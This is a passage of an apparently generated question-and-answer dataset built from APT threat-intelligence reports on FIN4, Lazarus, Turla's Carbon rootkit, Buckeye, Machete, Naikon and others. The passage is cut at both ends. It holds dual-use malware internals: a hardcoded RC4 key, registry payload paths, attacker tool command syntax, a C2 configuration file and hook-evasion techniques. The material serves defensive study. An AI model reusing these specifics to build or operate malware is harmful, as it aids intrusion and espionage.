FIN4 User Agents\nTable 1: List of known Actor-Registered C2 Domains\nWe have identified nine C2 domains that we believe were registered by the actors to conduct these operations. There are also legitimate domains that appear to have been compromised and used in previous campaigns in late 2013 and early 2014; however in the recent months we have not seen indications that the actor has used compromised legitimate domains to conduct their operations.\nMedium Headline: What Can Network Defenders Do?\nThe relative simplicity of FIN4's tactics (spearphishing, theft of valid credentials, lack of any malware installed on victim machines) makes their intrusion activity difficult to detect. However a few basic security measures can help\nthwart the group's efforts. Disabling VBA macros in Microsoft Office by default, as well as blocking the domains listed in Table 1 will help protect against FIN4's current activities. Additionally, enabling two-factor authentication for OWA and any other remote access mechanisms can help prevent credentials stolen in this manner from being leveraged successfully. Companies can also check their network logs for OWA logins from known Tor exit nodes if they suspect they are victimized.  Typically, legitimate users do not use Tor for accessing email. While not conclusive, if paired with known targeting by this group, the access from Tor exit nodes can serve as an indicator of the group's illicit logins.\nFireEye, Inc.  |  1440 McCarthy Blvd. Milpitas, CA 95035  |  408.321.6300  |  877.FIREEYE (347.3393)  |  (<>)info@fireeye.com  |  (<>)www.fireeye.com\n\u00a9 2014  FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc. All other brands, products, or service names are or may be trademarks or service marks of their respective owners. WP.HTS.EN-US.112014\n\nQ: What security measures can network defenders implement to mitigate the risks posed by FIN4's tactics, particularly focusing on the use of VBA macros and credential theft?",
    "output": "A: Network defenders can implement several security measures to counter FIN4's tactics. These include disabling VBA macros in Microsoft Office by default and blocking known C2 domains listed in Table 1. Enabling two-factor authentication for Outlook Web Access (OWA) and other remote access mechanisms can prevent stolen credentials from being successfully used. Additionally, monitoring network logs for OWA logins from known Tor exit nodes can serve as an indicator of potential illicit activity, as legitimate users typically do not use Tor for accessing email. These measures can help thwart FIN4's efforts despite the relative simplicity of their tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: Commandline: gpsvc.exe -e %param1% %param2%\nIn this mode the module extracts and stores additional executable on the filesystem (filepath is inside installation cryptocontainer). It uses %param2% to open the file as a cryptocontainer. Cryptocontainer is encrypted with two RC4 keys:\nA. KeyA which is 16 bytes of MD5 value from a string which is passed via %param1%\nB. KeyB is a hardcoded 32-byte binary value: 53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15\nIt contains payload data to be installed into registry and some paths.\nVery Small Headline: Commandline: gpsvc.exe -k %param1% %param2%\nIn this mode the module assumes that it can be a service binary, so it tries to behave as service. If it fails it falls back to regular standalone executable mode. Main purpose of this code is to find payload in the registry, decrypt it and inject into target process memory. The payload is stored in the following registry value:\nHKLM\\SYSTEM\\CurrentControlSet\\services\\%servicename%\\Security\\Data2\nIt is encrypted with RC4, and key is taken from the registry using the following binary value (16 bytes): HKLM\\SYSTEM\\CurrentControlSet\\services\\%servicename%\\Security\\Data3.\nThe cryptocontainer used by this module contains a magic value after it's decrypted with MD5 of the secret passed via commandline and hardcoded RC4 key. At offset 4 it has to contain the following DWORD: 0xBC0F1DAD (AD 1D 0F BC).\n\nHow does the Lazarus Group's `gpsvc.exe` module handle encryption and decryption of its cryptocontainers when using the command line parameters `-e %param1% %param2%`, and what specific steps are involved in this process?",
    "output": "A: The `gpsvc.exe` module of the Lazarus Group handles encryption and decryption of its cryptocontainers through a multi-step process involving two RC4 keys. When using the command line parameters `-e %param1% %param2%`, the module extracts and stores an additional executable on the filesystem. The file path is specified within the installation cryptocontainer. The cryptocontainer itself is encrypted with two RC4 keys: KeyA and KeyB. KeyA is derived from the first 16 bytes of the MD5 hash of a string passed via `%param1%`. KeyB is a hardcoded 32-byte binary value: `53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15`. The cryptocontainer includes payload data intended for installation into the registry and certain paths. This process ensures that the payload remains secure and can only be accessed with the correct keys.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SHELL_CREW\nAs part of the investigation, RSA Research was able to track suspected Shell_Crew actors in their ongoing exploitation campaign of a sensitive network over several months. These actors connected to a Derusbi server variant \"beachhead\" on this target network.\nOut of the thirteen different IP addresses used during this campaign against this one (APT) target, eleven (85%) were associated with Terracotta VPN nodes. At least in this month's long campaign, we see advanced threat actors using Terracotta VPN infrastructure to obscure their origins and cover their tracks.\nFor more information on these advanced threat actors, refer to the Shell_Crew report from the RSA Incident Response Team here: http://www.emc.com/collateral/white-papers/h12756-wp-shell-crew.pdf\nQ: How did the Shell_Crew actors leverage the Terracotta VPN infrastructure to enhance their attack operations, and what percentage of their IP addresses were linked to Terracotta VPN nodes?",
    "output": "The Shell_Crew actors leveraged the Terracotta VPN infrastructure to obscure their origins and cover their tracks during their exploitation campaign against a sensitive network. Out of the thirteen different IP addresses used by the Shell_Crew actors during this campaign, eleven (85%) were associated with Terracotta VPN nodes. This indicates a significant reliance on the Terracotta VPN infrastructure to maintain anonymity and evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Infection vector\nSpear phishing was used to spread the malware. A letter was prepared separately for each victim to grab their attention and prompt them to open an attached malicious Microsoft Office document.\nEach malware sample was compiled immediately before being sent and included the latest available version of the malware executable. Since the framework evolved from 2009 to 2017, the last releases are totally different from the first ones, so the current report details only the latest available version of the malware used until 2017.\nThe executable file embedded in the documents extracts two malicious files from itself, updater.mod and glue30.dll, and saves them in the working directory of the malware \u2013 %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Reorder.\nAfter that, it copies the legitimate rundll32.exe executable into the same directory and uses it to run the updater.mod library.\nMedium Headline: The updater.mod module\nThis module is implemented as a dynamic-link library with only one exported function, called callme@16. This module is responsible for such tasks as providing communication with the C2 server, providing the malware integrity and persistence mechanism and managing other malware modules.\nThe persistence mechanism is provided by a link file, which is placed by updater.mod into the startup folder, ensuring malware execution after a reboot. If the link file becomes corrupted, the updater.mod module restores it.\nMedium Headline: Communication with C2\nIn this campaign the C2 servers were mostly based on cloud storage at mydrive.ch. For every victim, the operators created a new account there and uploaded additional malware modules and a configuration file with commands to execute it. Once executed, the updater.mod module connected to the C2 and performed the following actions:\ndownloaded the command file to the working directory;\nuploaded files collected and prepared by additional malicious modules (if any) to the C2. These files were located in a directory called 'queue' or 'ntfsrecover' in the working directory. Files in this directory could have one of two extensions: .d or .upd depending on whether they had already been uploaded to the server or not.\ndownloaded additional malware modules:\ndfrgntfs5.sqt \u2013 a module for executing commands from the C2;\nmsvcrt58.sqt \u2013 a module for stealing mail credentials and emails;\nzl4vq.sqt \u2013 legitimate zlib library used by dfrgntfs5;\n%victim_ID%.upe \u2013 optional plug-in for dfrgntfs5. Unfortunately, we were unable to obtain this file.\nAll malware modules are encrypted with a custom algorithm:\nThe credentials for the C2 account are stored in the configuration that is placed in the registry, but the updater.mod module also stores a copy as an encrypted string in the executable file. Also, the configuration specifies how often updater.mod polls the C2, supporting both an active mode and a partly active mode.\nMedium Headline: Modules glue30.dll and msvcrt58.sqt\nThe glue30.dll malware module provides keylogging functionality. The updater.mod module uses the Win API function SetWindowsHookExW to install hooks for the keyboard and to inject glue30.dll into processes that get keyboard input. After that, glue30.dll loads and begins intercepting input in the context of each hooked process.\nThe msvcrt58.sqt module intercepts unencrypted POP3 traffic to collect email conversations and victims' credentials. This module looks for traffic from the following processes:\noutlook.exe;\nwinmail.exe;\nmsimn.exe;\nnlnotes.exe;\neudora.exe;\nthunderbird.exe;\nthunde~1.exe;\nmsmsgs.exe;\nmsnmsgr.exe.\nThe malware parses intercepted POP3 traffic and sends the result to the main module (updater.mod) for uploading to the C2. This is done by hooking the following network-related Win API functions:\nws2_32.connect;\nws2_32.send;\nws2_32.recv;\nws2_32.WSARecv;\nws2_32.closesocket.\nBig Headline: Conclusions\nDarkUniverse is an interesting example of a full cyber-espionage framework used for at least eight years. The malware contains all the necessary modules for collecting all kinds of information about the user and the infected system and appears to be fully developed from scratch. Due to unique code overlaps, we assume with medium confidence that DarkUniverse's creators were connected with the ItaDuke set of activities. The attackers were resourceful and kept updating their malware during the full lifecycle of their operations, so the observed samples from 2017 are totally different from the initial samples\nfrom 2009. The suspension of its operations may be related to the publishing of the 'Lost in Translation' leak, or the attackers may simply have decided to switch to more modern approaches and start using more widely available artefacts for their operations.\nAnswer this question: How did the glue30.dll module in the DarkUniverse APT framework function to capture keystrokes? Describe the technical method used to achieve this and the role of the updater.mod module in this process.",
    "output": "The glue30.dll module in the DarkUniverse APT framework provided keylogging functionality. The updater.mod module used the Win API function SetWindowsHookExW to install hooks for the keyboard and injected glue30.dll into processes that received keyboard input. Once injected, glue30.dll began intercepting input in the context of each hooked process. This allowed the malware to capture keystrokes and send the captured data back to the C2 server via the updater.mod module.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Buckeye cyberespionage group shifts gaze from US to Hong Kong\nSeveral organizations in Hong Kong are being targeted by a cyberespionage group known as Buckeye. By: Symantec Employee\nCreated 06 Sep 2016\nBuckeye (also known as APT3, Gothic Panda, UPS Team, and TG-0110) is a cyberespionage group that is believed to have been operating for well over half a decade. Traditionally, the group attacked organizations in the US as well as other targets. However, Buckeye's focus appears to have changed as of June 2015, when the group began compromising political entities in Hong Kong. Since March 2016, the group has appeared to mostly focus on organizations in Hong Kong, sending malicious emails to targets as recently as August 4, and attempting to spread within compromised networks in order to steal information.\nUsing the combined threat intelligence of Symantec and Blue Coat Systems, we have built a clear and concise picture of how Buckeye has evolved its tactics in recent years. This has allowed us to further enhance our protection capabilities against the group's campaigns.\nBig Headline: Shifting focus of attacks\nMore recently, Symantec telemetry has revealed Backdoor.Pirpi connections from compromised computers based in Hong Kong dating back to August 2015. The infections significantly increased in number towards the end of March 2016 and the beginning of April 2016. Additional investigations discovered related malware samples and determined that targeted organizations were political entities in Hong Kong.\nIn at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment. The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo. Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer.\nBig Headline: Who's being targeted?\nFrom 2015 to date, Symantec identified approximately 82 organizations in various regions that had Buckeye tools present on their network. However, this is not an accurate picture of the targets of interest to Buckeye. The group casts a wide net while trawling for targets but only remains active on the networks of organizations it is interested in. Symantec determined a more accurate picture of Buckeye's targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers. After these filters were applied to our data, we found a total of 17 organizations, located in Hong Kong (13), the US (3), and the UK (1).\nIt should be noted that this data goes back to 2015 and that the proportion of targets in Hong Kong from March 2016 would be considerably higher. Up to mid-2015, Buckeye's traditional targets were varying categories of US organizations, which match the types of victims seen in the UK. Buckeye interests changed substantially around June 2015 when the group began infecting organizations in Hong Kong. Infections in the UK and US ceased shortly after this time.\nBig Headline: Malware and tools\nBuckeye uses a number of hacking tools as well as malware. Many of the hacking tools are open source applications that have been patched or modified in some manner by Buckeye in an attempt to evade detection.\nBuckeye uses Backdoor.Pirpi, a remote access Trojan capable of reading, writing, and executing files and programs. Backdoor.Pirpi also collects information about the target's local network, including the domain controller and workstations.\nAs mentioned previously, Buckeye also uses a number of hacking tools, including the following:\nKeylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister. These parameters install it as a service. The keylogger then records\nkeystrokes in encrypted files, for example: thumbcache_96.dbx. It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway.\nRemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool. Usage is: %s shareIp domain [USER INFORMATION|[USER NAME AND PASSWORD]] [/run:[COMMAND]]\nThe commands to be passed consist of upload, download, Service (create, delete, start, stop), delete, rename, and AT\nPwDumpVariant: This tool imports lsremora.dll (often downloaded by the attacker as part of the toolset) and uses the GetHash export of this DLL. On execution, the tool injects itself into lsass.exe and is triggered with the argument \"dig\".\nOSinfo: OSInfo is a general purpose, system information gathering tool. It has the following command line argument help:\ninfo <Server/Domain> [options]\n[options]:\n-d Domain\n-o OsInfo\n-t TsInfo\n-n NetuseInfo\n-s ShareInfo ShareDir\n-c Connect Test\n-a Local And Global Group User Info\n-l Local Group User Info\n-g Global Group User Info\n- ga Group Administrators\n- gp Group Power Users\n- gd Group Domain Admins\n-f <infile> //input server list from infile, OneServerOneLine\ninfo <\\\\server> <user>\nChromePass: A tool from NirSoft used for recovering passwords stored in the Chrome browser.\nLazagne: A compiled Python tool that extracts passwords from various locally installed application classes, such as web browsers. The full list is: chats, svn, wifi, mails, windows, database, sysadmin, and browsers.\nBuckeye seems to target file and print servers, which makes it likely the group is looking to steal documents. This, coupled with the group's use of zero-day exploits in the past, customized tools, and the types of organizations being targeted would suggest that Buckeye is a state-sponsored cyberespionage group.\n\nWhat criteria did Symantec use to determine the primary targets of Buckeye, and how did the group's focus shift over time?",
    "output": "Symantec determined the primary targets of Buckeye by analyzing where the group remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers. This filtering method revealed that out of 82 organizations initially identified with Buckeye tools, only 17 were considered primary targets, located in Hong Kong (13), the US (3), and the UK (1). The group's focus shifted substantially around June 2015 when it began infecting organizations in Hong Kong, leading to a cessation of infections in the UK and US shortly afterwards. This shift indicates a strategic change in Buckeye's targeting priorities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PROMETHIUM and NEODYMIUM: Parallel zero-day attacks targeting individuals in Europe\nWindows Defender ATP\nMicrosoft proactively monitors the threat landscape for emerging threats. Part of this job involves observing the activities of targeted activity groups, which are often the first ones to introduce new exploits and techniques that are later used by other attackers. The previous two volumes of the Microsoft Security Intelligence Report explored the activities of two such groups, code-named STRONTIUM and PLATINUM, which used previously unknown vulnerabilities and aggressive, persistent techniques to target specific individuals and institutions\u2014 often including military installations, intelligence agencies, and other government bodies.\nThis volume chronicles two activity groups, code-named PROMETHIUM and NEODYMIUM, both of which target individuals in a specific area of Europe. Although most malware today either seeks monetary gain or conducts espionage for economic advantage, both of these activity groups appear to seek information about specific individuals.\nIn May 2016, both PROMETHIUM and NEODYMIUM were observed to launch attack campaigns. These campaigns used completely distinct infrastructure and primary malware, which indicated a lack of association at the operational level. However, the similarity in the campaigns' victim locale, timing, and use of the same zero-day exploit prior to public disclosure strongly indicates that the activity groups may be related at a higher organizational tier.\nMicrosoft is sharing information about these groups to raise awareness of their activities, and to help individuals and organizations implement existing mitigation options that significantly reduce risk from these attack groups and other similar groups.\n\nAnswer this question based on the above context: Why did Microsoft conclude that the activity groups PROMETHIUM and NEODYMIUM might be related at a higher organizational tier despite using distinct infrastructure and primary malware? Explain the reasoning behind this conclusion.",
    "output": "Microsoft concluded that the activity groups PROMETHIUM and NEODYMIUM might be related at a higher organizational tier due to several key factors. Firstly, both groups launched attack campaigns in May 2016, indicating a temporal correlation. Secondly, they targeted individuals in a specific area of Europe, suggesting a geographical overlap in their interests. Lastly, both groups utilized the same zero-day exploit prior to its public disclosure. Despite using completely distinct infrastructure and primary malware, which indicated a lack of association at the operational level, the similarities in victim locale, timing, and exploit usage strongly suggested a potential relationship at a higher organizational level.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Gaining Final Persistence\nBy adding a second stage malware to an infected system, final persistence is gained:\n\u2022 They usually run under administrator privileges and require a privilege escalation.\n\u2022 They are started in more complex ways at boot up time, typically using a service, or -in the case of rootkits -kernel drivers.\n\u2022 They also allow the execution of batch scripts and binaries in their tasks, but often also support plugins like key loggers and activities like taking screenshots.\n\u2022 They are usually multi-threaded. Received tasks are not immediately executed, but queued and later on executed via another thread, usually even running in a different process.\n\u2022 They use named pipes and mutexes to coordinate the different threads.\n\u2022 They do have a separate configuration file that allows incremental updates\n\u2022 They always install a unique trojan ID for every infected system\n\u2022 They support peer-to-peer functionality: tasks can be forwarded to other bots for execution.\nThis peer-to-peer functionality is a very important additional feature of the stage 2 malware. This means that a bot is able to receive a task from it's C&C server(s) and route it to another infected bot in the local network; results are sent back using the same path in the reverse direction. To facilitate this feature, every infected bot gets a unique trojan ID at infection time, and every task contains initial routing information, potentially even using several intermediate hops, but we never actually observed tasks with more than two hops. The peer-to-peer network uses different methods for communication, very common are named pipes, but also direct TCP connections are possible. These relations are shown in the following illustration:\nThe first actual stage 2 trojan appeared around the same time as the corresponding recon tool, though we only discovered it some time later. The programmers called it Carbon in the configuration file, so we also use this name; another name for it, derived from a PDB string, is Cobra (a type of snake, but this is not the Snake rootkit). It came as a rootkit and added peer-to-peer functionality, but otherwise didn't implement more elaborate functions. It used the same cryptographic algorithm as the recon tool, and also the same hardcoded key. As a rootkit, it had a component running in kernel mode, and 2 components running in user mode (one for C&C communication, and one for task execution). The kernel mode component tried to hide all activities from system monitoring, and in addition implemented an encrypted, virtual file store (VFS). The VFS was realized as 100 MB file (hidden by the rootkit) with an NTFS filesystem on it. CAST128 was also used for encryption of the VFS, but in a different encryption mode (CBC), with IVs derived from the block index, and a different hardcoded key. This VFS was used to store the user mode components, a configuration file, received (and not yet executed or forwarded) tasks, results not yet sent out, and logging information. Also a volatile virtual storage was implemented (like a RAM disk) for intermediate task results. The rootkit was very advanced for its time, and is a clear ancestor of the well known Snake rootkit. In 2009, we also found 64 bit implementations of the rootkit. There was no digital signature required at this time, not even on 64 bit systems; the later Snake rootkit used digitally signed, vulnerable VMware drivers as a carrier (vboxdrv.sys), as documented in several papers published in the past years.\nThe configuration file was a simple text file, in later versions it was additionally CAST-encrypted. Here is an (anonymized) example for such a configuration file:\n1 [NAME]\n2 object_id=1c2e30cd-abb3-41ef-a74d37 3\n4\n5\n[TIME]\n6\nuser_winmin = 700000\n7\nuser_winmax = 1200000\n8\nsys_winmin = 1800000\n9\nsys_winmax = 1900000\n10\ntask_min = 30000\n11\ntask_max = 40000\n12\ncheckmin = 60000\n13\ncheckmax = 70000\n14\nlogmin = 600000\n15\nlogmax = 1200000\n16\nlastconnect=1223023515\n17\ntimestop=\n18\nactive_con = 900000\n19\n20 [CW_LOCAL]\n21 quantity = 0\n22\n23 [CW_INET]\n24 quantity = 2\n25 address1 = 1.2.3.4:80\n26 address2 = 5.6.7.8:80\n27\n28 [TRANSPORT]\n29 user_pipe = \\\\.\\pipe\\userpipe\n30 system_pipe = \\\\.\\pipe\\iehelper 31 32\n33 [DHCP]\n34 server = 135\n35 36\n37 [LOG]\n38 lastsend =1223021515\n39 logperiod = 7200 40\n41 [WORKDATA]\n42 run_task=\n43 run_task_system=\n44 [VERSION]\n45 System=Carbon v1.53\n46 User=Carbon v1.42\nIn the CW_INET section, we see the C&C servers. Several can be configured, they are selected using the round robin method. Bots that do not contact C&C servers directly lack this section. CW_LOCAL is then used instead. TRANSPORT defines the internal named pipes for communication between the different threads on an infected bot.\nThe injection mechanism is more complex than the one of Tavdig, but follows the same basic principle. As a main difference, named pipes are used to communicate between the active threads. Typically, the thread injected into the web browser now is only responsible for C&C communication (and so can be called comm thread); received data, and data queued to be sent out, is stored in the VFS as dedicated files. The work\nthread, however, lives in a long-living process, like explore.exe, and executes tasks received by the comm thread. This means that receiving a task, executing a task, and sending out the results are decoupled, using a file system in between and named pipes for synchronization. This makes the setup far more reliable, tasks can't easily get lost anymore. Besides named pipes, mutexes are also required to avoid race conditions. This is also a disadvantage, it results in a more complex setup and easier detection due to pipe and mutex names.\nAnother drawback is the limited size of the VFS (100MB). Tasks -and mainly task results -can't be larger than this.\nIn 2012, we discovered a new Carbon variant. The main difference to the original Carbon from 2007 was it's lack of rootkit features and lack of VFS. It was only implemented as 2 usermode DLLs (implementing the same functionality as the original usermode DLLs), and a simple service binary started via the registry, but of course under administrative privileges. That's why we call it Carbon-DLL. The VFS was replaced by just using a random, already existing directory under the program directory tree, and encryption is realized by just CAST128-encrypting all single files in this working directory. The path of this working directory is stored in a random .inf file, using the hard disk serial number as fingerprint. So all the rootkit's hiding functions were replaced by obfuscation functions. Technically, this is more basic than using a rootkit, and it could be called a step backward -we assume the programmers were forced to do this due to Microsoft requiring kernel mode drivers to be digitally signed around this time. But it is also an advantage, because it makes the infection more stable, and in some way harder to detect, as there are no hidden files that suddenly become visible in safe mode. Also the problem with limited VFS size is solved, the only limit is the size of the root partition. Carbon DLL's most important evolution though was C&C cryptography: Like Tavdig, Carbon-DLL implements asymmetric encryption, but in this implementation based upon RSA. CAST128 encryption was still used under the hood, but that's probably only for historical reasons and does not add to the overall security. Carbon-DLL stored its keys in the configuration file. Note that RSA encryption only applies to infected bots, which directly communicate with C&C servers -and only these bots have configured keys; actually a separate section is added to the configuration file, in order to store keys for bots needing to communicate with C&C servers. However, this section doesn't exist upon installation; it can be added later on request, triggered by a specific task. Peer to peer communication behind these bots in the local network are only encrypted using CAST128, or not at all.\nFinally, the Snake rootkit must also be mentioned, though we never actually observed it in this case. It was used in other countries, and many publications exist about it. Uroburos is also sometimes used as another term for Snake, but sometimes Uroburos is also used for the whole family (which is, technically spoken, not correct). Snake is another stage 2 trojan, but we're not aware if it's used together with some recon tools. In terms of functionality, it contains features of both the Carbon rootkit and Carbon-DLL at the same time:\n\u2022 It is a rootkit, like the Carbon rootkit. This rootkit also works on 64 bit systems, requiring digitally signed drivers. To do this, it uses a exploitable, digitally signed driver from VMWare, as described in several publications. Hence it's an evolution of the Carbon rootkit. Like the afore mentioned, it contains an encrypted and hidden file store, but with increased size.\n\u2022 It lacks the asymmetric encryption used in Carbon-DLL, it's again based upon CAST128. So you can't call it an evolution of Carbon-DLL.\nThe best way to describe Snake is to call it a sibling of Carbon-DLL -as if the development of the Carbon rootkit split into 2 branches, one ending in Carbon-DLL, and one ending in Snake.\n\nWhat role does the configuration file play in the operation of the Carbon rootkit, and how is it structured?",
    "output": "The configuration file in the Carbon rootkit is a simple text file that can be CAST-encrypted in later versions. It includes sections such as [NAME], [TIME], [CW_LOCAL], [CW_INET], [TRANSPORT], [DHCP], [LOG], [WORKDATA], and [VERSION]. The file specifies various parameters like object ID, timing windows, C&C server addresses, named pipes for communication, and version information. This file allows for incremental updates and customization of the malware's behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: HIGHLIGHTS:\nAPT-C-36, also known as Blind Eagle, is a financially motivated threat group that has been launching indiscriminate attacks against citizens of various countries in South America since at least 2018.\nIn a recent campaign targeting Ecuador based organizations, CPR detected a new infection chain that involves a more advanced toolset.\nThe backdoor chosen for this campaign is typically used by espionage campaigns, which is unusual for this group\nQuestion: Why did the choice of backdoor used by APT-C-36 (Blind Eagle) in their recent campaign targeting Ecuador-based organizations stand out as unusual? How might this shift in tactics impact the way cybersecurity experts approach mitigating threats from this group?",
    "output": "Answer: The choice of backdoor used by APT-C-36 (Blind Eagle) in their recent campaign targeting Ecuador-based organizations stood out as unusual because it is typically associated with espionage campaigns rather than financially motivated attacks. This shift in tactics suggests that Blind Eagle may be adopting more sophisticated methods, potentially to evade detection or to diversify their attack strategies. Cybersecurity experts need to be aware of this change and adjust their defensive measures accordingly. They should enhance their monitoring for both financially motivated and espionage-related indicators of compromise (IOCs), and consider that Blind Eagle may be expanding their capabilities beyond traditional financial targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: What is \"Machete\"?\n\"Machete\" is a targeted attack campaign with Spanish speaking roots. We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012. The operation may be still \"active\".\nThe malware is capable of the following cyber-espionage operations:\nLogging keystrokes\nCapturing audio from the computer's microphone\nCapturing screenshots\nCapturing geolocation data\nTaking photos from the computer's web camera\nCopying files to a remote server\nCopying files to a special USB device if inserted\nHijjacking the clipboard and capturing information from the target machine\nBig Headline: How does \"Machete\" operate?\nThe malware is distributed via social engineering techniques, which includes spear-phishing emails and infections via Web by a fake Blog website. We have found no evidence of of exploits targeting zero-day vulnerabilities. Both the attackers and the victims appear to be Spanish-speaking.\nDuring this investigation, we also discovered many other the files installing this cyber-espionage tool in what appears to be a dedicated a spear phishing campaign. These files display a PowerPoint presentation that installs the malware on the target system once the file is opened. These are the names of the PowerPoint attachments:\nHermosa XXX.pps.rar\nSuntzu.rar\nEl arte de la guerra.rar\nHot brazilian XXX.rar\nThese files are in reality Nullsoft Installer self-extracting archives and have compilation dates going back to 2008.\nA consequence of the embedded Python code inside the executables is that these installers include all the necessary Python libraries as well as the PowerPoint file shown to the victim during the installation. The result is extremely large files, over 3MB.\nHere are some screnshots of the mentioned files:\nA technical relevant fact about this campaign is the use of Python embedded into Windows executables of the malware. This is very unusual and does not have any advantage for the attackers except ease of coding. There is no multi-platform support as the code is heavily Windows-oriented (use of libraries). However, we discovered several clues that the attackers prepared the infrastructure for Mac OS X and Unix victims as well. In addition to Windows components, we also found a mobile (Android) component.\nBoth attackers and victims speak Spanish natively, as we see it consistently in the source code of the client side and in the Python code.\nBig Headline: Conclusion\nThe \"Machete\" discovery shows there are many regional players in the world of targeted attacks. Unfortunately, such attacks became a part of the cyber arsenal of many nations located over the world. We can be sure there are other parallel targeted attacks running now in Latin America and other regions.\nKaspersky Lab products detect malicious samples related to this targeted attack as Trojan-\nSpy.Python.Ragua.\nNote: A full analysis of the Machete attacks is available to the Kaspersky Intelligent Services customers. Contact: (<mailto:intelreports@kaspersky.com>)intelreports@kaspersky.com\n\nHow does the 'Machete' malware distribute itself, and what techniques does it employ to infect its targets? Why might the use of social engineering techniques be particularly effective in this case?",
    "output": "The 'Machete' malware distributes itself primarily through social engineering techniques, including spear-phishing emails and infections via a fake blog website. It uses PowerPoint presentations embedded within Nullsoft Installer self-extracting archives to install the malware on the target system when the file is opened. The names of these PowerPoint attachments include 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. The use of social engineering techniques is particularly effective because it leverages human curiosity and trust, making it easier to trick users into opening malicious files without relying on zero-day vulnerabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does Linux/Moose utilize near-home scanning to bypass firewalls and spread further copies of itself? Explain the process and its effectiveness.",
    "output": "Linux/Moose uses the public IP address returned by the configuration C&C server to perform near-home scanning on the Telnet port. This scanning targets random IP addresses within the same /15 network of the infected router's public IP. This method effectively bypasses perimeter firewalls and allows the worm to spread further copies of itself. During monitoring, it was observed that Telnet access was three times more successful when scanning for near-home IP addresses compared to random IP addresses on the Internet. This success rate is attributed to NAT and misconfigured firewalls, which are common due to the complexity of modern networks and the volume of firewall rules.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SHARED EXPLOIT GENERATION KIT\nIt's interesting that what appear to be multiple campaigns and crews all use a kit that generates CVE-2012-0158 exploits embedded with arbitrary backdoors for spear-phishing. One of the interesting characteristics of the Naikon APT's kit-produced shell-code is its runtime function offset calculations and control flow are built to jump past behavior-based protection and sandbox analysis. Each of the win32 api shellcode calls are carefully executed to land just past function hot patch space and prologues, evading user mode trampolines and hooks.\nMsnMM, Naikon and Rarstone backdoors were generally delivered with stock 0158 exploits. Some dropped iph.bat and an \"iExplorer.exe\" that began with a \"WMcal\" parameter and profile.dat executable blob loaded into a running IE process. Other APTs use this kit as well. We found Stone Panda Poison Ivy samples delivered with the same CVE-2012-0158 exploits, dropping iph.bat and iExplorer.exe, and running the \"iExplorer.exe WMcal\" executable filename and parameter.\nFinally, we found another exploit builder's template used to attack Korean-speaking targets. It was used across this group and others for building CVE-2012-0158 files, sharing the common author \"Tran Duy Linh\".\nMedium Headline: Similar strings\nWhile the Naikon backdoor maintained the user-agent string \"NOKIAN95/WEB\", it also maintained a debug path\nf:\\MyProjects\\xServer\\Release\\xServer.pdb\nAlso, the Naikon backdoor's matching management software is called \"xsControl\". Plugins for the Naikon backdoor included a screenshot grabber named xsAdv.dll, and a single export \"XS_Screencap\".\nThis debug path in Naikon backdoors is very similar to the debug path maintained in Rarstone backdoors:\ng:\\MyProjects\\xsFunction\\Release\\DLL.pdb\nThe MsnMM campaign backdoors all maintain an \"MM\" internal name, and the functionality changes when comparing them:\n\u2022 WinMM\n\u2022 WininetMM\n\u2022 SslMM\nA more recent oddity from this group includes a WinMM dropper with the internal name \"Zhixin\", creating a recently compiled Sys10 backdoor.\nSome \"MM\" executables maintained debug strings across versions and families:\nJ:\\chong\\new\\Release\\SslMM.exe\nand\nJ:\\chong\\nod\\Release\\SslMM.exe\nMedium Headline: Shared infrastructure\nNow, let's take a look at some of the shared infrastructure that helps to tie all of these campaigns together. MsnMM backdoors and naikon backdoors share portions of infrastructure across campaigns. For a quick example, early msnMM back-doors like sslMM, and one of the later tools, exe_exchange, share some domains with the nokian95 (naikon) and sys10 backdoors. There is much crossover.\nHere, you can see a table recording domains that are shared across the backdoors for command and control infrastructure.\nMedium Headline: Correlating target profiles with spear-phish and decoy content\nOne of the most striking characteristics of this APT is that its targeting interest is revealed by its spear-phish and decoy content. Malicious actors of all stripes, including cybercriminals, have for at least the last ten years abused \"hot topics\" in their social-engineering content to better attract and mass-exploit victim systems. It's a pretty worn-out discussion. What is different about the Naikon APT's use of hot topics in spear-phish and decoy content is that reveals its specific victims and how these change over time. Precision social engineering seems to be an elevated skill set for the group.\nA few of the most interesting examples of such content include: a UN discussion and vote on nuclear proliferation and disarmament, the MH370 flight, and construction on the Raytheon-built National Coast Watch Center in PH.\nFor example, in the second week of October 2012, during the gang's intense ongoing focus on SE Asian countries like Cambodia and its diplomats, we find a winMM backdoor detected as \"Trojan.Win32.Agent.udtc\" in New York City. This verdict identified the Naikon\nAPT's backdoor on the victim system. The 